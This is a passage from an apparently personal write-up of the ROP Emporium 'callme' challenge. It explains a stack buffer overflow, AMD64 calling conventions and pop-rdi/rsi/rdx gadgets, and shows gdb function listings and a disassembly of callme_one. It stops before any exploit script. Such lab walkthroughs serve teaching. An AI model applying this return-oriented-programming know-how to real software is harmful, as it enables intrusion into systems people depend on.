&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above disassembled code, we are reading 0x200 bytes from the standard input file descriptor and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.&lt;/p&gt;
&lt;p&gt;For exploitation stack overflow, we need to fill our buffer, overwrite the rbp register and control the return address.&lt;/p&gt;
&lt;p&gt;For building our ropchain, we need to understand the calling conventions of AMD64 ABI. The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.&lt;/p&gt;
&lt;p&gt;Because the system function receives one argument, we need to look for one gadgets that we control the rdi, rsi and rdx registers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What are gadgets?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.&lt;/p&gt;
&lt;p&gt;The example of the &lt;strong&gt;pop rdi,pop rsi,pop rdx, ret&lt;/strong&gt; gadget is shown in image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/poprdi_callme.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/poprdi_callme.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Next step is to determine the address of callme_one, callme_two, callme_three functions. For determining the functions address we use gdb to get the memory addresses.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;info&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;functions&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;All&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;defined&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;functions&lt;/span&gt;:

&lt;span style=&#34;color:#06b6ef&#34;&gt;Non&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt;:
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006a8&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_init&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006d0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;callme_three@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400700&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400710&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400720&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;callme_one@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400730&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;setvbuf@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400740&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;callme_two@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400750&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;exit@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400760&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_start&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400790&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_dl_relocate_static_pie&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004007a0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;deregister_tm_clones&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004007d0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;register_tm_clones&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400810&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__do_global_dtors_aux&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400840&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;frame_dummy&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400847&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400898&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004008f2&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;usefulFunction&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040093c&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;usefulGadgets&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400940&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004009b0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_fini&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004009b4&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_fini&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the &lt;strong&gt;callme&lt;/strong&gt; binary does PLT relocations of the functions of callme* , we need to disassemble the target shared library &lt;strong&gt;libcallme.so&lt;/strong&gt; as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;vx@archie:&lt;span style=&#34;color:#06b6ef&#34;&gt;callme$&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;gdb&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;q&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libcallme.so&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libcallme.so...&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;found&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libcallme.so&lt;/span&gt;)
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;callme_one&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;callme_one&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000081a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000081b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000081e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x30&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000822&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x18&lt;/span&gt;],rdi
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000826&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;],rsi
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000082a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x28&lt;/span&gt;],rdx
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000082e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;movabs&lt;/span&gt; rax,&lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000838&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x18&lt;/span&gt;],rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000083c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;34&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color:#f99b15&#34;&gt;0x912&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;callme_one&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;248&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000842&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;movabs&lt;/span&gt; rax,&lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000084c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;],rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000850&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;54&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color:#f99b15&#34;&gt;0x912&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;callme_one&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;248&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000856&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;movabs&lt;/span&gt; rax,&lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000860&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x28&lt;/span&gt;],rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000864&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color:#f99b15&#34;&gt;0x912&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;callme_one&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;248&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000086a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x8&lt;/span&gt;],&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000872&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rsi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x32f&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xba8&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000879&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;95&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x32a&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xbaa&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;------&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;------&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000912&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;248&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x301&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xc1a&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000919&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;255&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x6c0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000091e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;260&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x1&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000923&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;265&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x720&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;exit@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000928&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;270&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000929&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;271&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;leave&lt;/span&gt;  
